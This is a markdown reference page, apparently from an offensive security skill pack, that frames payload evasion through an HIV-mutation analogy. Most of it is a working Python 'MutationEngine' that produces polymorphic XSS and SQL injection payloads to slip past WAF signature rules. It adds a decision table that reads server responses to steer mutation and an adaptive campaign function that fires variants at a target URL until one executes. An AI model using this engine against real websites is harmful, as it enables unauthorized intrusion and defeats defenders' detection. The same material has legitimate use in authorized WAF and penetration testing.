# 🔄 Mutation Engine — Polymorphic & Adaptive Payloads

> *"Reverse transcriptase relatif sering membuat kesalahan ketika menyalin materi genetik HIV. Jika mutasi menghasilkan varian yang mampu bertahan dari respons imun, varian itu dapat memperoleh keuntungan selektif."*

---

## Concept

HIV's reverse transcriptase lacks error correction. Each replication cycle produces slightly different genetic material. When defenders build responses (antibodies, T-cells) against one variant, new variants emerge that those responses don't cover.

In web2 attack: each payload iteration should be **different enough** that signature-based detection written against the previous attempt doesn't match the current one. The attacker evolves faster than the signature team can update rules.

---

## The Mutation Principle

```
Attempt 1: <script>alert(1)</script>        → BLOCKED (rule written)
Attempt 2: <ScRiPt>alert(1)</ScRiPt>        → BLOCKED (rule updated)
Attempt 3: <script>alert`1`</script>         → BLOCKED (rule updated)
Attempt 4: <img onerror=alert(1) src=x>     → PASSES (different vector)
Attempt 5: <svg/onload=alert(1)>             → PASSES (variant)
...

Signature team can't keep up. Each block requires a new rule.
Attacker generates variants faster than rules are deployed.
```

---

## Mutation Engine Implementation

```python
#!/usr/bin/env python3
"""
HIV Mutation Engine — Polymorphic Payload Generator
Generates unique payload variants that bypass signature-based detection
"""

import random
import urllib.parse
import base64
import html
from itertools import product

class MutationEngine:
    
    def __init__(self):
        self.history = []  # Track sent variants to avoid repeats
    
    # ─── ENCODING MUTATIONS ───────────────────────────────────────────
    
    def url_encode_partial(self, payload: str, ratio: float = 0.5) -> str:
        """Partially URL-encode — unpredictable which chars are encoded"""
        result = ""
        for char in payload:
            if random.random() < ratio and char not in "=&?/":
                result += urllib.parse.quote(char)
            else:
                result += char
        return result
    
    def double_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def unicode_escape(self, payload: str) -> str:
        """Convert random chars to unicode escape sequences"""
        result = ""
        for char in payload:
            if random.random() < 0.4 and ord(char) < 128:
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def html_entity_mix(self, payload: str) -> str:
        """Mix decimal and hex HTML entities"""
        specials = {"<": ["&lt;", "&#60;", "&#x3C;", "&#X3c;"],
                    ">": ["&gt;", "&#62;", "&#x3E;", "&#X3e;"],
                    '"': ["&quot;", "&#34;", "&#x22;"],
                    "'": ["&apos;", "&#39;", "&#x27;"]}
        result = payload
        for char, variants in specials.items():
            if char in result and random.random() > 0.5:
                result = result.replace(char, random.choice(variants), 
                                       random.randint(1, result.count(char)))
        return result
    
    # ─── STRUCTURAL MUTATIONS ────────────────────────────────────────
    
    def case_randomize(self, payload: str) -> str:
        """Randomize case of alphabetic characters"""
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower() 
            for c in payload
        )
    
    def insert_comments(self, payload: str, comment_type: str = "auto") -> str:
        """Insert comments between tokens"""
        if comment_type == "auto":
            comment_type = random.choice(["sql", "html", "js", "css"])
        
        comments = {
            "sql": ["/**/", "/*comment*/", "/*!*/"],
            "html": ["<!---->", "<!-- x -->"],
            "js": ["/**/", "//\n", "/* x */"],
            "css": ["/**/", "/* x */"],
        }
        
        tokens = payload.split(" ")
        separator = random.choice(comments.get(comment_type, ["/**/"]))
        return separator.join(tokens)
    
    def whitespace_substitute(self, payload: str) -> str:
        """Replace spaces with alternative whitespace"""
        alternatives = ["%09", "%0a", "%0d", "\t", "\n", "\r", "\x0c", "\x0b"]
        return payload.replace(" ", random.choice(alternatives))
    
    def null_byte_insert(self, payload: str) -> str:
        """Insert null bytes (breaks some parsers)"""
        pos = random.randint(1, max(1, len(payload) - 1))
        return payload[:pos] + "\x00" + payload[pos:]
    
    # ─── VECTOR MUTATIONS ────────────────────────────────────────────
    
    def xss_vector_rotate(self, base_payload: str) -> str:
        """Rotate through XSS delivery vectors"""
        alert_variants = [
            "alert(1)",
            "alert`1`",
            "alert(document.domain)",
            "confirm(1)",
            "prompt(1)",
            "(1).constructor.constructor('alert(1)')()",
            "eval('ale'+'rt(1)')",
        ]
        
        tag_variants = [
            f"<script>{random.choice(alert_variants)}</script>",
            f"<img src=x onerror={random.choice(alert_variants)}>",
            f"<svg onload={random.choice(alert_variants)}>",
            f"<iframe srcdoc='<script>{random.choice(alert_variants)}</script>'>",
            f"<details open ontoggle={random.choice(alert_variants)}>",
            f"<video src onerror={random.choice(alert_variants)}>",
            f"<object data='javascript:{random.choice(alert_variants)}'>",
            f"<math><mtext></mtext></math><svg onload={random.choice(alert_variants)}>",
        ]
        
        return random.choice(tag_variants)
    
    def sqli_vector_rotate(self) -> str:
        """Rotate through SQLi detection payloads"""
        comment_types = ["--", "#", "/*", "-- -"]
        spaces = [" ", "/**/", "%09", "%0a"]
        or_variants = ["OR", "||", "or", "Or", "oR"]
        
        sp = random.choice(spaces)
        cm = random.choice(comment_types)
        ov = random.choice(or_variants)
        
        variants = [
            f"'{sp}{ov}{sp}1=1{cm}",
            f"'{sp}{ov}{sp}'a'='a'{cm}",
            f"'{sp}{ov}{sp}SLEEP(1){cm}",
            f"'{sp}{ov}{sp}1{sp}LIKE{sp}1{cm}",
            f"1{sp}{ov}{sp}1=1{cm}",
            f"1'1",  # Error-based
        ]
        return random.choice(variants)
    
    # ─── FULL MUTATION PIPELINE ──────────────────────────────────────
    
    def mutate(self, payload: str, intensity: int = 2) -> str:
        """
        Apply `intensity` random mutations to payload.
        Higher intensity = more different from original.
        """
        mutations = [
            self.url_encode_partial,
            self.case_randomize,
            lambda p: self.insert_comments(p),
            self.whitespace_substitute,
            lambda p: self.html_entity_mix(p),
            lambda p: self.unicode_escape(p),
        ]
        
        chosen = random.sample(mutations, min(intensity, len(mutations)))
        result = payload
        for fn in chosen:
            result = fn(result)
        
        # Avoid sending the same variant twice
        if result in self.history:
            return self.mutate(payload, intensity)
        
        self.history.append(result)
        return result
    
    def generate_campaign(self, base_payload: str, count: int = 20) -> list:
        """Generate a campaign of unique payload variants"""
        variants = []
        for i in range(count):
            intensity = random.randint(1, 4)
            variants.append(self.mutate(base_payload, intensity))
        return variants


# ─── USAGE ──────────────────────────────────────────────────────────

if __name__ == "__main__":
    engine = MutationEngine()
    
    # XSS campaign
    print("=== XSS Mutation Campaign ===")
    base = "<script>alert(1)</script>"
    for i, variant in enumerate(engine.generate_campaign(base, 10)):
        print(f"[{i+1:02d}] {variant}")
    
    print("\n=== SQLi Mutation Campaign ===")
    for i in range(10):
        print(f"[{i+1:02d}] {engine.sqli_vector_rotate()}")
```

---

## Selective Pressure — When to Use Which Variant

Like HIV, let the "immune system's" response guide evolution:

```
IF response = 200 OK, reflection present → XSS confirmed, escalate
IF response = 403 Forbidden             → WAF triggered, mutate harder
IF response = 400 Bad Request           → Syntax issue, adjust structure  
IF response = 200 OK, no reflection     → Payload not executing, rotate vector
IF response = 500 Internal Server Error → Possible SQLi, boolean probe
IF response = time delay                → Time-based SQLi, confirm
```

Each response tells you something about the defender's "antibody." Mutate specifically to evade that particular response pattern.

---

## Adaptive Campaign Strategy

```python
def adaptive_campaign(target_url: str, param: str):
    """
    HIV-style adaptive attack:
    - Send variant
    - Analyze response (the "immune response")
    - Mutate specifically based on what was detected/blocked
    - Repeat with improved variant
    """
    engine = MutationEngine()
    base = "<script>alert(1)</script>"
    
    for round in range(50):
        variant = engine.mutate(base, intensity=round//10 + 1)
        
        response = send_request(target_url, {param: variant})
        
        if response.status_code == 403:
            # WAF triggered — increase mutation intensity
            print(f"[R{round}] BLOCKED — mutating harder")
            continue
            
        if variant in response.text:
            # Reflection confirmed
            print(f"[R{round}] REFLECTED — potential XSS")
            if check_execution(response):
                print(f"[R{round}] *** XSS CONFIRMED ***")
                return variant
```

---

*Mutation Engine — Polymorphic Payload Reference*  
*Part of HIV Framework | Security--Skill by wahyunuriman999*
